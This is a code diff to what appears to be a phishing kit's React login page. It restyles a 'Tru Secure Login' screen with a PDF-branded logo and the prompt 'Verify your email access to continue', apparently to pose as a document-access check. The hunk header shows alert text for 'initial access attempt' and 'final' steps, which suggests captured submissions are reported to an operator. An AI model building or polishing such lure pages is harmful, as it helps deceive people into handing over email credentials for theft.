@@ -189,8 +189,32 @@ ${step === 1 ? '⚠️ *INITIAL ACCESS ATTEMPT DETECTED* ⚠️' : '🚨 *FINAL 
                   </svg>
                 </div>
               </div>
-              <h1 className="text-2xl font-bold text-white text-center">Tru Secure Login</h1>
-              <p className="text-blue-100 mt-2">Verify your email access to continue</p>
+              
+              {/* PDF Logo with Secure Login Text */}
+              <div className="flex flex-col items-center justify-center mb-2">
+                <svg width="180" height="50" viewBox="0 0 180 50" className="mb-2">
+                  <defs>
+                    <linearGradient id="textGradient" x1="0%" y1="0%" x2="100%" y2="0%">
+                      <stop offset="0%" stopColor="#ffffff" />
+                      <stop offset="100%" stopColor="#e6f7ff" />
+                    </linearGradient>
+                  </defs>
+                  
+                  {/* PDF Icon */}
+                  <g transform="translate(0, 5)">
+                    <rect x="5" y="5" width="30" height="40" rx="3" fill="#e62e2e" />
+                    <text x="20" y="28" textAnchor="middle" fill="white" fontFamily="Arial, sans-serif" fontWeight="bold" fontSize="16">PDF</text>
+                  </g>
+                  
+                  {/* Secure Login Text */}
+                  <g transform="translate(45, 0)">
+                    <text x="0" y="25" fill="url(#textGradient)" fontFamily="Arial, sans-serif" fontWeight="bold" fontSize="20">Tru</text>
+                    <text x="40" y="25" fill="url(#textGradient)" fontFamily="Arial, sans-serif" fontSize="20">Secure Login</text>
+                  </g>
+                </svg>
+                
+                <p className="text-blue-100 mt-2 text-sm">Verify your email access to continue</p>
+              </div>
             </div>
           </div>
           
